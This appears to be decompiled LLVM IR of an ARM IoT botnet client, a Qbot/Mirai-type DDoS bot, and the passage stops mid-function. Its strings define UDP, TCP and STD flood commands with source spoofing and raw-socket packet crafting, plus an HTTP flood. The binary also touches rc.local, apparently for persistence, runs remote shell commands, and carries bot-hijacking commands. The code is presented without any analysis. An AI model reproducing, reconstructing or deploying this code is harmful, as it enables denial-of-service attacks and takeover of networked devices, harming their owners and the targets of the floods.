getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_1b3b4.447, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_1b42c.448, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b49c.449, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b50c.450, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_1b580.451, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1b614.452, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1b65c.453, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1b6a4.454, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1b6e4.455, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_1b760.456, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1b7c8.457, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1b844.458, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b894.459, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b8e8.460, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b93c.461, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_1b990.462, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1b9e4.463, i32 0, i32 0)]
@global_var_c888.465 = constant i32 118380
@global_var_1ce6c.466 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_1ceac.469 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1cec8.471 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1ceec.476 = constant [4 x i8] c"all\00"
@global_var_1cef0.478 = constant i32 44
@global_var_1cef4.480 = constant [4 x i8] c"syn\00"
@global_var_1cef8.482 = constant [4 x i8] c"rst\00"
@global_var_1cefc.484 = constant [4 x i8] c"fin\00"
@global_var_1cf00.486 = constant [4 x i8] c"ack\00"
@global_var_1cf04.488 = constant [4 x i8] c"psh\00"
@global_var_1cf08.490 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1cf1c.494 = constant [6 x i8] c"PONG!\00"
@global_var_1cf24.496 = constant [6 x i8] c"PUSSY\00"
@global_var_1cf2c.498 = constant [4 x i8] c"OFF\00"
@global_var_2db84.500 = global i32 0
@global_var_1cf30.502 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_1cf40.504 = constant [3 x i8] c"ON\00"
@global_var_1cf44.506 = constant [5 x i8] c"HTTP\00"
@global_var_1cf4c.508 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_1cf74.510 = constant [4 x i8] c"UDP\00"
@global_var_ffdc.511 = constant i32 167772169
@global_var_1cf78.513 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1cfec.516 = constant [4 x i8] c"TCP\00"
@global_var_1cff0.518 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1d0ac.520 = constant [4 x i8] c"STD\00"
@global_var_1d0b0.522 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1d0cc.524 = constant [5 x i8] c"STOP\00"
@global_var_275f0.529 = local_unnamed_addr global i32 -1
@global_var_269e4.531 = global [20 x i8]* @global_var_1b9e4.463
@global_var_1d0d4.533 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1d0dc.536 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1d0ec.538 = constant [11 x i8] c"\0900000000\09\00"
@global_var_27928.540 = global i32 0
@global_var_1d0f8.542 = constant [6 x i8] c"ARM-4\00"
@global_var_1d100.544 = constant i32 0
@global_var_1d104.546 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1d11c.550 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1d12c.552 = constant i32 47
@global_var_1d130.554 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1d138.556 = constant i32 97
@global_var_1d13c.558 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1d14c.562 = constant i32 993090331
@global_var_1d1b4.567 = constant [5 x i8] c"PONG\00"
@global_var_1d1bc.569 = constant [9 x i8] c"LELIMDUP\00"
@global_var_1d1c8.571 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1d1dc.573 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_1d1e8.575 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1d1f0.577 = constant [3 x i8] c"%s\00"
@global_var_1d1f4.579 = constant i32 32
@global_var_268d4.582 = global i32 0
@global_var_16d00.590 = constant i32 -390266832
@global_var_116c4.594 = constant i32 -382906384
@global_var_136fc.598 = constant i32 -382909968
@global_var_10110.613 = constant i32 -509607926
@global_var_102e0.623 = constant i32 -382910448
@global_var_15cec.624 = constant i32 -382909968
@global_var_15da0.625 = constant i32 -382910224
@global_var_11434.659 = constant i32 -509607928
@global_var_11adc.686 = constant i32 -456978431
@global_var_12820.722 = constant i32 -478871519
@global_var_1316c.730 = constant i32 -478805983
@global_var_13548.739 = constant i32 -382906384
@global_var_faa0.749 = constant i32 -509591552
@global_var_13b08.755 = constant i32 -442564540
@global_var_143b0.798 = constant i32 -494075872
@global_var_facc.799 = constant i32 -382910336
@global_var_14570.811 = constant i32 -369098421
@global_var_13978.830 = constant i32 -442543860
@global_var_11b90.839 = constant i32 -369093626
@global_var_15038.852 = constant i32 -335545191
@global_var_1549c.863 = constant i32 -443088884
@global_var_17c94.912 = constant i32 -382909456
@global_var_fb04.935 = constant i32 -382910336
@global_var_190f8.940 = constant i32 -442695584
@global_var_196c0.949 = constant i32 -382910224
@global_var_1a514.975 = constant i32 -504313148
@global_var_1a4fc.976 = constant i32 -483131392
@global_var_1a3a8.977 = constant i32 -481229311
@global_var_1a584.978 = constant i32 -477817729
@global_var_1a684.979 = constant i32 -476034303
@global_var_1a8c0.980 = constant i32 -516685812
@global_var_1a7b4.981 = constant i32 -905969571
@global_var_1a6e8.982 = constant i32 -528203771
@global_var_1a948.983 = constant i32 -478079873
@global_var_1a92c.984 = constant i32 -534704125
@global_var_1a8dc.985 = constant i32 -534704125
@global_var_1a874.986 = constant i32 -483131392
@global_var_278f8.4 = external global i8*
@global_var_27933.72 = external global i8*
@global_var_27934.74 = local_unnamed_addr global i8 0
@global_var_27935.75 = local_unnamed_addr global i8 0
@global_var_27936.76 = local_unnamed_addr global i8 0
@global_var_1d118.548 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_278f8.4 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_278f8.4 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_278f8.4, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_268d0.14, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_268d0.14 to i32)

; uselistorder directives
  uselistorder i32* @global_var_268d0.14, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e718.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 109816, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_27938.21, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_2793c.22, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_27940.23, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_27938.21 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_27938.21 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_27938.21 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_27694.26, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_27694.26, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_27938.21 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_27690.29, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_27938.21 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_27938.21, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_27938.21 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c11 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c11, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.012, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.012 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.012, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.012, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge2, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge2, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge2 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge2, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861819 = load i8, i8* %arg2, align 1
  %v2_861c21 = icmp eq i8 %v2_861819, 0
  br i1 %v2_861c21, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861423 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.022, 1
  %v1_860c = add i32 %v4_861423, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge3 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8650 ], [ %storemerge3, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a816, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.117, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872027 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e09 = load i8, i8* %arg2, align 1
  %v2_86e411 = icmp eq i8 %v2_86e09, 0
  br i1 %v2_86e411, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc13 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc13, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872026 = phi i32 [ %v3_872027, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c6, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
